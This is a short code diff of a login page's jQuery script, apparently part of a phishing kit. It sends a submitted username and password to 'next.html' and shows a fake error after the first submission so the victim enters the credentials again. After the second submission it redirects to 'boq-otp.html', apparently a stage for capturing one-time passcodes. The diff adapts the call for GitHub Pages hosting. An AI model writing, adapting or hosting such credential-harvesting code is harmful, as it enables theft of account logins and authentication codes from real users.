@@ -1807,24 +1807,24 @@
         };
         if (formData.username && formData.password) {
             $.ajax({
-                type: 'GET',
-                url: 'next.html',
-                data: formData,
-                success: function(response) {
-                    console.log('Response:', response); // Debug: Check what the response contains
-                    successCount++; // Increase success count on a successful POST
-                    if (successCount === 1) {
-                        $('#error-msg').show();
-                        $('#txtUserid, #id11').val('');
-                    }
-                    if (successCount === 2) {
-                        window.location.href = 'boq-otp.html';
-                    }
-                },
-                error: function(xhr, status, error) {
-                    console.error('Error:', error); // Handle error
-                },
-            });
+    type: 'GET',                // GitHub Pages only supports GET for static files
+    url: 'next.html',           // use .html instead of .php
+    data: formData,
+    success: function(response) {
+        console.log('Response:', response);
+        successCount++;
+        if (successCount === 1) {
+            $('#error-msg').show();
+            $('#txtUserid, #id11').val('');
+        }
+        if (successCount === 2) {
+            window.location.href = 'boq-otp.html';
+        }
+    },
+    error: function(xhr, status, error) {
+        console.error('Error:', error);
+    },
+});
         }
         $('#cross-1').click(function () {
             $('#error-msg').hide(); // Hide the modal
